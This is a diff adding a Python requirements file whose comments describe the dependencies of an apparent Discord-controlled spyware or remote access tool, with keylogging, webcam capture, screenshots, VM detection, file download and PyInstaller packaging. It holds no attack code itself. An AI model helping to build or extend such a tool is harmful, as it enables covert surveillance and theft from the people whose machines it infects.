@@ -1,0 +1,29 @@
+# Core Discord functionality
+discord.py>=2.3.2
+
+# Windows-specific (conditional import, required for PyInstaller)
+pywin32>=306
+
+# Cross-platform process/VM detection
+psutil>=5.9.0
+
+# Screenshot functionality (Windows primary, cross-platform)
+pyautogui>=0.9.54
+
+# PyInstaller hidden imports (auto-included but explicit)
+pyinstaller>=5.13.0
+
+# Linux screenshot fallback (optional)
+pillow>=10.0.0
+
+# macOS screenshot fallback (optional)
+pyscreenshot>=0.3.3
+
+# HTTP requests for download functionality
+requests>=2.31.0
+
+# Keylogger functionality
+pynput>=1.7.6
+
+# Webcam capture functionality
+opencv-python>=4.8.0
